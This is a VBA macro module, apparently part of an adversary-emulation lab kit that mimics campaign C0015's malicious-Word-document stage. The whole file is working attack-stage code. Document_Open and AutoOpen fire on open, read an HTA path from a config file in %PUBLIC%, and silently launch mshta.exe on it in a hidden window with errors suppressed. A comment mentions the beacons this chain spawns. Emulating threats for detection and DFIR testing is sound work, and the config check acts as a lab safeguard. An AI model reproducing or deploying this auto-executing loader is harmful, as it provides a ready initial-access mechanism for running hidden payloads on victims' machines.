Attribute VB_Name = "c0015Entry"
' ============================================================
' c0015 entry macro (benign, config-driven) - [LAB-SURROGATE]
' Maps to the source campaign: T1204.002 (user execution via Word
' macro), T1059.005 (VBA). Mirrors DFIR: macro launches the HTA
' bootstrap.
'
' NO HARDCODED LAB VALUES: the HTA path and mshta path are read from
' %PUBLIC%\C0015\config.ini. If config is absent the macro does
' nothing (this is the CONTROL path, not an error fallback).
'
' Word auto-execution: both Document_Open and AutoOpen call the same
' entry so the document runs whichever auto macro Word recognizes on
' the installed build. A module-level flag prevents the chain from
' starting twice within one open (both auto macros firing would
' otherwise spawn two beacons).
' ============================================================
Private m_bootstrapStarted As Boolean

Private Sub RunEntry()
    If m_bootstrapStarted Then Exit Sub
    m_bootstrapStarted = True
    On Error GoTo FailSafe

    Dim fso As Object
    Set fso = CreateObject("Scripting.FileSystemObject")
    Dim iniPath As String
    iniPath = Environ("PUBLIC") & "\C0015\config.ini"
    If Not fso.FileExists(iniPath) Then Exit Sub   ' control: no config -> no action

    Dim ini As Object
    Set ini = fso.OpenTextFile(iniPath, 1)
    Dim htaPath As String, mshtaPath As String
    htaPath = "": mshtaPath = ""
    Do Until ini.AtEndOfStream
        Dim ln As String
        ln = ini.ReadLine
        If Left(ln, 9) = "hta_path=" Then htaPath = Mid(ln, 10)
        If Left(ln, 11) = "mshta_path=" Then mshtaPath = Mid(ln, 12)
    Loop
    ini.Close

    If htaPath = "" Then Exit Sub                   ' config incomplete -> stop (no fallback value)
    If mshtaPath = "" Then mshtaPath = "C:\Windows\System32\mshta.exe"  ' OS constant only

    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    sh.Run """" & mshtaPath & """ """ & htaPath & """", 0, False
    Exit Sub
FailSafe:
    ' silent fail = control behavior; no chain is created
End Sub

Public Sub Document_Open()
    RunEntry
End Sub

Public Sub AutoOpen()
    RunEntry
End Sub